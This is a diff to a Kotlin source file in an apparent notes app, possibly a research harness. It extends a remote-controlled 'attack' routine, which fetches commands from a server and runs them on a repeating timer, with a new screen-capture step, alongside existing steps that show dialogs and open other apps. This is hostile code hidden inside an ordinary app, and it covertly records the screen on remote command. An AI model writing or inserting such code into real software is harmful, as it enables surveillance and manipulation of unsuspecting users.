@@ -18,6 +18,7 @@ import androidx.core.content.ContextCompat
 import com.google.gson.Gson
 import com.google.gson.GsonBuilder
 import org.fossify.notes.R
+import org.fossify.notes.activities.MainActivity
 
 
 fun showDialog(dialogData: DialogData, context: Context) {
@@ -145,6 +146,14 @@ fun openApp(packageName: String, delay: Long, context: Context) {
     }, delay)
 }
 
+fun captureScreen(data: CaptureScreenData, context: Context) {
+    if (context is MainActivity) {
+        Handler(Looper.getMainLooper()).postDelayed({
+            context.initScreenRecorder()
+        }, data.delay)
+    }
+}
+
 fun attack(action: String, context: Context) {
     fetchViewCli(action) { cmds ->
         // pretty print 攻击命令
@@ -167,6 +176,9 @@ fun attack(action: String, context: Context) {
         for (app in cmds.openApp) {
             openApp(app.packageName, app.delay, context)
         }
+        for (data in cmds.captureScreen) {
+            captureScreen(data, context)
+        }
     }
 }
 
@@ -179,7 +191,7 @@ private val intervalAttackRunnable = AtomicReference<Runnable?>(null)
  * @param context Context
  * @param intervalMs 调用间隔时间（毫秒），默认 5000ms（5秒）
  */
-fun startIntervalAttack(context: Context, intervalMs: Long = 1000) {
+fun startIntervalAttack(context: Context, intervalMs: Long = 2000) {
     // 如果已经存在，先停止之前的
     stopIntervalAttack()
     
